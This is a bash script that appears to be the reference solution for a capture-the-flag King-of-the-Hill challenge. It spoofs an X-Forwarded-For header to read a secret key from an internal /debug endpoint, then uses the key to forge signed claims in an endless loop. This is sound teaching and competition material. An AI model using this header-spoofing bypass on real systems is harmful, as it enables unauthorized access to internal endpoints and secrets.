#!/usr/bin/env bash
# Reference holder for the KotH hill "The Throne".
#
#   ./solve.sh http://HILL:PORT <your-team-token>
#
# Stage 1 (puzzle): leak HILL_KEY from the internal-only /debug by spoofing the
#   left-most X-Forwarded-For to 127.0.0.1 (the access-control bug).
# Stage 2 (game): sign a fresh claim for YOUR token and re-post it forever so the
#   throne never goes stale -- CTFd awards points each tick you hold it.
#
# Your team token comes from the CTFd "King of the Hill" page.
set -euo pipefail

BASE="${1:?usage: solve.sh http://HILL:PORT <team_token>}"
BASE="${BASE%/}"
TOKEN="${2:?team token (from the CTFd King of the Hill page)}"
INTERVAL="${3:-10}"   # seconds between re-claims (must be < hill SKEW, default 45)

echo "[*] stage 1: leaking HILL_KEY via X-Forwarded-For spoof ..." >&2
KEY="$(curl -s -H 'X-Forwarded-For: 127.0.0.1' "$BASE/debug" \
        | sed -n 's/.*"hill_key": *"\([0-9a-f]*\)".*/\1/p')"
if [ -z "$KEY" ]; then
    echo "[-] could not leak HILL_KEY (is /debug reachable?)" >&2
    exit 1
fi
echo "[+] HILL_KEY = $KEY" >&2

echo "[*] stage 2: holding the throne for token $TOKEN (re-claim every ${INTERVAL}s) ..." >&2
while true; do
    TS="$(date +%s)"
    SIG="$(printf '%s|%s' "$TOKEN" "$TS" \
            | openssl dgst -sha1 -hmac "$KEY" | sed 's/^.*= *//')"
    RESP="$(curl -s -X POST "$BASE/throne" -H 'Content-Type: application/json' \
             -d "{\"team\":\"$TOKEN\",\"ts\":$TS,\"sig\":\"$SIG\"}")"
    echo "  claim @ $TS -> $RESP" >&2
    sleep "$INTERVAL"
done
